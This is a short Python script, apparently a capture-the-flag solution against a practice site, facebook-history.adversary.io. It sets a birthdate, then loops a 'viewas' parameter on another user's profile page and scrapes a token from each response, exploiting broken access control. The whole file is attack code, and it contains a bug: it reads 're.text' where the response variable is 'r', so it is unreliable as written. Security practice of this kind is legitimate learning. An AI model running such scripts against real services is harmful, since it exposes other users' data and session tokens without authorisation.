#!/usr/bin/env python
import re
import requests

url = 'https://facebook-history.adversary.io/'

s = requests.Session()

s.get(url)

s.post('https://facebook-history.adversary.io/settings', data = {'birthdate': '29-10-2018'})

for i in range(1,12):
    r = s.get('https://facebook-history.adversary.io/profile?userId=2&viewas=%d' % i)

    token = re.findall('token=(.*?)"', re.text)[0]
    print token